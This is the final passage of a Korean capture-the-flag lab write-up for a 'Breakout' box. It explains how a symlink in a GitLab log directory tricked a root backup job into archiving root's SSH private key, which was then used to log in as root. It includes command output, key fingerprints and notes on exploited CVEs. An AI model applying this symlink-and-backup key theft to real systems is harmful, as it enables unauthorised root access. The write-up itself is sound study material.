`fs.protected_symlinks` 는 보통 `1` 이지만 이 공격을 막지 못함. 그 보호는 **누구나 쓸 수 있는 sticky 디렉터리(`/tmp` 등)에서 링크 소유자와 사용자가 다를 때**만 추종을 막고, `/var/log/gitlab/gitaly` 는 `git` 소유 0700 일반 디렉터리라 보호 대상이 아님.

백업이 돈 뒤 호스트 계정으로 전개:

```text
coaran@breakout:/opt/backups$ unzip log_backup.zip -d /tmp/
Archive:  log_backup.zip
   creating: /tmp/srv/gitlab/logs/gitaly/
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log
  inflating: /tmp/srv/gitlab/logs/gitaly/current
 extracting: /tmp/srv/gitlab/logs/gitaly/lock
   creating: /tmp/srv/gitlab/logs/gitlab-rails/
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log
   creating: /tmp/srv/gitlab/logs/gitlab-shell/
   creating: /tmp/srv/gitlab/logs/postgresql/
  inflating: /tmp/srv/gitlab/logs/postgresql/current
 extracting: /tmp/srv/gitlab/logs/postgresql/lock
   creating: /tmp/srv/gitlab/logs/reconfigure/
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646332280.log
   creating: /tmp/srv/gitlab/logs/redis/
  inflating: /tmp/srv/gitlab/logs/redis/current
 extracting: /tmp/srv/gitlab/logs/redis/lock
   creating: /tmp/srv/gitlab/logs/sshd/
  inflating: /tmp/srv/gitlab/logs/sshd/current
 extracting: /tmp/srv/gitlab/logs/sshd/lock
 extracting: /tmp/srv/gitlab/logs/gitaly/gitaly_hooks.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/auth.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log
   creating: /tmp/srv/gitlab/logs/alertmanager/
   creating: /tmp/srv/gitlab/logs/gitlab-exporter/
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/current
 extracting: /tmp/srv/gitlab/logs/gitlab-exporter/lock
   creating: /tmp/srv/gitlab/logs/gitlab-workhorse/
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/current
 extracting: /tmp/srv/gitlab/logs/gitlab-workhorse/lock
   creating: /tmp/srv/gitlab/logs/logrotate/
 extracting: /tmp/srv/gitlab/logs/logrotate/current
 extracting: /tmp/srv/gitlab/logs/logrotate/lock
   creating: /tmp/srv/gitlab/logs/nginx/
 extracting: /tmp/srv/gitlab/logs/nginx/current
 extracting: /tmp/srv/gitlab/logs/nginx/gitlab_error.log
 extracting: /tmp/srv/gitlab/logs/nginx/error.log
 extracting: /tmp/srv/gitlab/logs/nginx/lock
 extracting: /tmp/srv/gitlab/logs/nginx/access.log
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log
   creating: /tmp/srv/gitlab/logs/prometheus/
  inflating: /tmp/srv/gitlab/logs/prometheus/current
 extracting: /tmp/srv/gitlab/logs/prometheus/lock
   creating: /tmp/srv/gitlab/logs/puma/
  inflating: /tmp/srv/gitlab/logs/puma/current
 extracting: /tmp/srv/gitlab/logs/puma/lock
   creating: /tmp/srv/gitlab/logs/redis-exporter/
  inflating: /tmp/srv/gitlab/logs/redis-exporter/current
 extracting: /tmp/srv/gitlab/logs/redis-exporter/lock
   creating: /tmp/srv/gitlab/logs/sidekiq/
  inflating: /tmp/srv/gitlab/logs/sidekiq/current
 extracting: /tmp/srv/gitlab/logs/sidekiq/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/current
 extracting: /tmp/srv/gitlab/logs/alertmanager/lock
   creating: /tmp/srv/gitlab/logs/grafana/
   creating: /tmp/srv/gitlab/logs/postgres-exporter/
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/current
 extracting: /tmp/srv/gitlab/logs/postgres-exporter/lock
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log
  inflating: /tmp/srv/gitlab/logs/puma/puma_stdout.log
  inflating: /tmp/srv/gitlab/logs/grafana/current
 extracting: /tmp/srv/gitlab/logs/grafana/lock
  inflating: /tmp/srv/gitlab/logs/alertmanager/@4000000062225c44189a7064.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@4000000062225c4419243204.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@4000000062225c441a099894.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@4000000062225c441970236c.u
  inflating: /tmp/srv/gitlab/logs/grafana/@4000000062225c441a0d6d0c.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@4000000062225c4419cc1a64.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@4000000062225c4419aeca7c.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@4000000062225c4419ea6c1c.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@4000000062225c441a87c944.u
  inflating: /tmp/srv/gitlab/logs/puma/@4000000062225c441a5cc974.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646418990.log
  inflating: /tmp/srv/gitlab/logs/redis/@4000000062225c441a19b1ac.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@4000000062225c441abc6dd4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@4000000062225c441a6531cc.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000062225c341459482c.u
  inflating: /tmp/srv/gitlab/logs/alertmanager/@400000006a83e2bc1f2fd554.u
  inflating: /tmp/srv/gitlab/logs/gitaly/@400000006a83e2bc1d93f3ec.u
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/@400000006a83e2bc1c9cda1c.u
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/@400000006a83e2bc1c96e6ac.u
  inflating: /tmp/srv/gitlab/logs/grafana/@400000006a83e2bc1c6a8364.u
 extracting: /tmp/srv/gitlab/logs/logrotate/@400000006a83e2bc1cf283cc.u
  inflating: /tmp/srv/gitlab/logs/postgres-exporter/@400000006a83e2bc1c6101cc.u
  inflating: /tmp/srv/gitlab/logs/postgresql/@400000006a83e2bc1d304464.u
  inflating: /tmp/srv/gitlab/logs/prometheus/@400000006a83e2bc1ca51f4c.u
  inflating: /tmp/srv/gitlab/logs/puma/@400000006a83e2bc1d9cdd2c.u
  inflating: /tmp/srv/gitlab/logs/reconfigure/1722646642.log
  inflating: /tmp/srv/gitlab/logs/redis/@400000006a83e2bc1c58b4cc.u
  inflating: /tmp/srv/gitlab/logs/redis-exporter/@400000006a83e2bc1bcf06b4.u
  inflating: /tmp/srv/gitlab/logs/sidekiq/@400000006a83e2bc1ca0aaac.u
  inflating: /tmp/srv/gitlab/logs/sshd/@4000000066ad807a2881f8e4.u
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/production.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/auth.log.1.gz
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/application.log.1.gz
  inflating: /tmp/srv/gitlab/logs/nginx/gitlab_access.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stdout.log.1.gz
 extracting: /tmp/srv/gitlab/logs/puma/puma_stderr.log.1.gz
  inflating: /tmp/srv/gitlab/logs/gitaly/keykey
```

**마지막 줄이 성공 판정임** — `inflating: .../gitaly/keykey`:

| unzip 표시 | 의미 |
|---|---|
| `inflating:` | 압축된 실제 내용이 들어 있음 → 아카이버가 **링크를 따라가 파일 내용을 저장**함 |
| `extracting:` | 크기 0 또는 저장(stored) 항목 |
| `linking:` | 심링크가 링크 그대로 저장됨(`zip -y`) → 이 공격은 실패 |

`unzip -l log_backup.zip | grep keykey` 로 **전개 전에** 판정하는 편이 안전하고, `-d /tmp/` 를 빼면 현재 디렉터리(`/opt/backups`)에 풀려 증거를 어지럽힘.

**아카이브 안의 경로가 호스트 경로를 알려줌.** 컨테이너 안에서 `mount` 로는 마운트 포인트(`/var/log/gitlab`)만 보이지 호스트 경로가 안 보임. 그런데 아카이브 내부 경로는 `srv/gitlab/logs/...` 로 시작함 — 아카이브의 경로는 **아카이브를 만든 프로세스가 본 경로**이기 때문임.

| 컨테이너 안 | 호스트 |
|---|---|
| `/var/log/gitlab` | `/srv/gitlab/logs` |
| `/etc/gitlab` | `/srv/gitlab/config` `[가정]` — 표준 배포 관례에서 유추. 이 박스에서 확인하지 않음 |
| `/var/opt/gitlab` | `/srv/gitlab/data` `[가정]` — 동일 |

호스트 경로를 몰라도 **절대 경로 링크는 통함** — 읽는 쪽이 자기 루트에서 해석하기 때문임. 반대로 파일을 특정 호스트 경로에 떨어뜨려야 하는 공격(호스트 cron 디렉터리 쓰기 등)은 매핑을 정확히 알아야 함.

**백업 주기는 실측하지 못했음.** 심링크 생성이 05:55 UTC, root 로그인이 06:20:03 UTC 이므로 **주기 상한은 24분**임. `[가정]` 정확한 주기는 미상 — root 홈의 `build.sh`·`healthy.sh`·`docker-compose.yml` 을 읽지 않았고 `pspy` 도 돌리지 않았음(**관측 없음**). 스케줄러가 cron 인지 systemd timer 인지도 확인하지 않았음.

```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ vi rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 rootkey

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i rootkey root@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 06:20:03 AM UTC

  System load:  0.01              Processes:                328
  Usage of /:   91.2% of 9.78GB   Users logged in:          1
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   5%                IPv4 address for ens160:  192.168.243.182

  => / is using 91.2% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Fri Mar  4 18:36:31 2022
root@breakout:~# ls
build.sh  data.zip  docker-compose.yml  healthy.sh  proof.txt  snap
root@breakout:~# cat proof.txt
84a74dc9ac82971bfdb19df921c85322
```

회수한 키의 주석이 `root@breakout` 로 확인됨:

```bash
ssh-keygen -l -f rootkey
# 3072 SHA256:X1rgMVWSBlUzWErCnEamvvVocSQeRqBh+5pE6GbGpNU root@breakout (RSA)
```

`root` 로 SSH 가 되는 것 자체가 오설정임 — `PermitRootLogin` 이 `prohibit-password`(기본) 이상이면 **키 로그인은 허용**되므로 root 개인키를 얻는 순간 끝남. `PermitRootLogin no` 였다면 키를 얻고도 못 들어가고, 그 경우의 대안은 얻은 키를 다른 계정에 쓰거나 링크 대상을 `/root/proof.txt` 로 잡아 플래그만 뽑는 것임.

root 홈의 `docker-compose.yml`·`build.sh`·`healthy.sh` 가 바인드 마운트 정의와 백업 작업의 1차 사료이나 **읽지 않았음**(위 `ls` 출력에 존재만 확인됨).

### Post-Exploitation

**Proof.txt value:**
`84a74dc9ac82971bfdb19df921c85322`

플래그 둘 다 표준 위치임 — `/home/coaran/local.txt` · `/root/proof.txt`. 컨테이너 안 `git` 홈에는 플래그가 없었고, 그 사실 자체가 「여기가 최종 목적지가 아니다」라는 신호였음.

⚠️ **증거 형식이 시험 기준에 못 미침.** 값과 타겟 pty 프롬프트(`coaran@breakout:~$` · `root@breakout:~#`)는 남았으나, `whoami; id; hostname; hostname -I; date; cat …` 을 **한 화면에 담은 증거 파일이 없음**(`~/PG/Breakout/` 에 `proof_user.txt`·`proof_root.txt` 없음 — 관측 없음). 시험에서는 이 형식이 없으면 감점이므로 플래그를 읽는 그 명령에 함께 묶을 것.

**남긴 흔적** — 인스턴스는 Stop 시 파괴되므로 원복 대상이 아니고, 무엇을 심었는지의 기록으로 남김.

| 항목 | 상태 |
|---|---|
| `/var/log/gitlab/gitaly/keykey` (root 키 심링크) | 남음. 컨테이너와 호스트(`/srv/gitlab/logs/gitaly/keykey`) 양쪽에 존재 |
| `/opt/backups/log_backup.zip` 안의 root 개인키 사본 | 남음 |
| `/tmp/srv/gitlab/logs/**` (전개된 로그 트리) | 남음 |
| `/tmp/1.sh` (초기 시도에서 만든 스크립트) | 남음 |
| GitLab 에 업로드된 악성 DjVu (`/uploads/**`) | 남음 |
| GitLab 로그(`production.log`·`api_json.log`)의 익스플로잇 요청 기록 | 남음 |

획득 자격증명 — `coaran` 개인키(`~/backups/mykey`, 주석 `coaran@breakout`, SHA256:`ELxfNDSJfyjudSlilpOR8ZVoCfjWRngkkktMwgcOSJU`) · `root` 개인키(`/root/.ssh/id_rsa`, 주석 `root@breakout`, SHA256:`X1rgMVWSBlUzWErCnEamvvVocSQeRqBh+5pE6GbGpNU`).
열거된 계정 — `root`(Administrator) · `webmaster` · `michelle` · `coaran`.
Kali 쪽 정리 — 리스너·tmux 종료. NFS 마운트 없음.

## 관련

- CVE-2021-22205 — GitLab CE/EE 무인증 RCE (CVSS 10.0): <https://nvd.nist.gov/vuln/detail/CVE-2021-22205>
- CVE-2021-22204 — ExifTool DjVu ANT 청크 Perl 코드 실행(근본 원인). 취약 범위 7.44 – 12.23, 12.24 에서 수정: <https://nvd.nist.gov/vuln/detail/CVE-2021-22204>
- 사용한 PoC: <https://github.com/inspiringz/CVE-2021-22205> · EDB 50532(Jacob Baines, 의존성 없는 수동 절차)
- GitLab 익명 사용자 열거 이슈: <https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/40158>
- Info-ZIP `zip(1)` — `-y, --symlinks: store symbolic links as such in the zip archive` (미지정 시 링크를 따라감)
- GTFOBins <https://gtfobins.github.io/> — `zip`·`tar`·`unzip` 의 파일 읽기/쓰기 프리미티브
- `pspy`(크론·프로세스 감시): <https://github.com/DominicBreuker/pspy>
- [[Exghost]] — 같은 CVE-2021-22204. 운반체가 달랐음(JPEG 안에 DjVu vs DjVu 원본)
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]
- [[_PLAYBOOK#B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다]] · [[_PLAYBOOK#B-1-29. 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로]] · [[_PLAYBOOK#B-61. 개인키의 주석은 소유자가 아니다]] · [[_PLAYBOOK#B-39. 와일드카드 인젝션 — 도구별 벡터]]
- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] · [[Zipper]] · [[Cockpit]] — 크론·백업 작업이 내 디렉터리를 건드리는 권한상승 패턴
- [[Hub]] · [[Levram]] · [[RubyDome]] — "버전 판정은 독립 근거 2개"
